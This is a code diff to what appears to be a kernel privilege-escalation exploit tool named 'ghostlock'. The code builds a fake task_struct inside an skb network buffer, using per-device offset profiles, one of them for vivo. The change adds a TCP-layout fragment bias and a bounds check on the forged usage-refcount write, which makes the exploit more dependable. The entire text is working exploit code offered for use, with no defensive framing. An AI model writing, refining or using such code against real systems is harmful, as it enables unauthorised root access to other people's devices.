@@ -338,7 +338,8 @@ namespace ghostlock::support {
             session::g_exploit_session.profile,
             [](auto policy) { return std::decay_t<decltype(policy)>::tcp_payload_layout; });
         long long payload_delta = tcp_layout ? 0 : kernel::SKB_DATA_DELTA;
-        size_t chunk_bias = tcp_layout ? 0xe80 : static_cast<size_t>(kernel::SKB_FRAG_BIAS);
+        size_t chunk_bias = tcp_layout ? static_cast<size_t>(kernel::TCP_SKB_FRAG_BIAS)
+                                       : static_cast<size_t>(kernel::SKB_FRAG_BIAS);
         size_t fake_task_off = tcp_layout ? kernel::TCP_FAKE_TASK_OFF : static_cast<size_t>(kernel::FAKE_TASK_OFF);
 
         uintptr_t payload_base = base + static_cast<uintptr_t>(payload_delta);
@@ -443,7 +444,23 @@ namespace ghostlock::support {
                                              ? v->task.pi_blocked_on
                                              : ghostlock::profile::fake_task_pi_blocked_on_off();
 
-            put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
+            uint32_t ft_usage_off = (v && v->task.usage)
+                                        ? v->task.usage
+                                        : kernel::FAKE_TASK_USAGE_OFF;
+            /* The usage refcount write must stay inside this payload chunk of
+             * the skb buffer. `p` already carries chunk + chunk_bias, so the
+             * absolute end is chunk + chunk_bias + fake_task_off + ft_usage_off
+             * + 4. An imported/prebuilt profile with an out-of-range
+             * task_struct.usage would otherwise write past the buffer; fail
+             * prepare cleanly (like the cred-copy path) instead. A no-op for
+             * valid profiles (vivo usage=56, legacy fallback 0x40). */
+            if (chunk + chunk_bias + fake_task_off + ft_usage_off + sizeof(uint32_t) >
+                kernel::SKB_SEND_SIZE) {
+                pr_error("task_struct.usage offset %u overruns the payload chunk\n",
+                         ft_usage_off);
+                return 0;
+            }
+            put32(p, fake_task_off + ft_usage_off, 0x100);
             put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_pi_lock_off, 0);
